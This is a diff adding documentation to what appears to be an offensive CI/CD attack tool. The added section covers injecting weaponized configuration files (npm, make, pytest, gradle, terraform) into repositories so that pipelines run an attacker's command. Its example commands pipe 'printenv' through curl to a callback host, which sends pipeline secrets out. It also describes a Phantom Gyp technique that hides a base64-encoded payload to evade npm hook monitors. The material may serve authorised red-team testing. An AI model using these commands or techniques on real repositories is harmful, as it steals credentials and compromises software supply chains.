@@ -96,6 +96,50 @@ Modify repo scripts called by CI (workflow hopping) — harder to detect than CI
 - `--script-prepend` bool: Prepend payload (default: true) or append.
 - `--trigger-pipeline` bool: Trigger a pipeline after injection.
 
+### LOTP config-file injection (`--lotp-inject`)
+
+Weaponize a tool's configuration file so that the next pipeline run executes an attacker-controlled command. Based on the [Living off the Pipeline (LOTP)](https://boostsecurityio.github.io/lotp/) catalog of 60+ tools that are "RCE-by-design" in CI.
+
+- `--lotp-tool` string: Tool to weaponize (required): `npm-gyp`, `npm`, `make`, `pytest`, `goreleaser`, `gradle`, `terraform`
+- `--cmd` string: Shell command to inject (required).
+- `--trigger-pipeline` bool: Trigger a pipeline on the branch after injecting.
+
+Output JSON fields: `branch`, `tool`, `files_committed`, `description`, `reference`, optionally `pipeline_url`.
+
+**Available LOTP tools:**
+
+| Tool | Files committed | Trigger |
+|------|----------------|---------|
+| `npm-gyp` / `gyp` | `binding.gyp` + `index.js` | `npm install` (via node-gyp, bypasses package.json hooks) |
+| `npm` | `package.json` | `npm install` (postinstall hook) |
+| `make` | `Makefile` | `make` ($(shell) expansion at parse time) |
+| `pytest` | `conftest.py` | `pytest` (auto-imported at collection) |
+| `goreleaser` | `.goreleaser.yml` | `goreleaser release/build/check` (before hooks) |
+| `gradle` | `build.gradle` | `gradle`/`./gradlew` (Groovy config-time exec) |
+| `terraform` | `main.tf` | `terraform plan`/`apply` (null_resource local-exec) |
+
+**Payload-only rendering (no credentials needed):**
+```bash
+gogatoz attack --payload-only --payload lotp-gyp --cmd 'id'
+gogatoz attack --payload-only --payload lotp-make --cmd 'printenv | curl -sd @- https://callback.url'
+```
+Output is JSON with `tool`, `files[]` (path + content), `description`, `reference`.
+
+**Example — Phantom Gyp attack:**
+```bash
+# Generate and inspect the payload (no token needed)
+gogatoz attack --payload-only --payload lotp-gyp \
+  --cmd 'printenv | curl -sd @- https://callback.example.com' | jq .
+
+# Inject into target project (Developer access required)
+gogatoz attack --target group/nodejs-project \
+  --lotp-inject --lotp-tool npm-gyp \
+  --cmd 'printenv | curl -sd @- https://callback.example.com' \
+  --branch lotp-attack --deconflict suffix --json
+```
+
+**The Phantom Gyp technique** (StepSecurity research): Places `binding.gyp` + `index.js` in the repo. When `npm install` runs, npm auto-invokes `node-gyp rebuild`. The gyp `<!(node index.js)` command substitution executes the payload. No `preinstall`/`postinstall` appears in `package.json` — bypassing the most common npm hook monitors. The command is base64-encoded in `index.js` to evade string matching.
+
 ### Auto-merge (`--auto-merge`)
 
 Create MR, self-approve, and merge to default branch (supply chain attack).
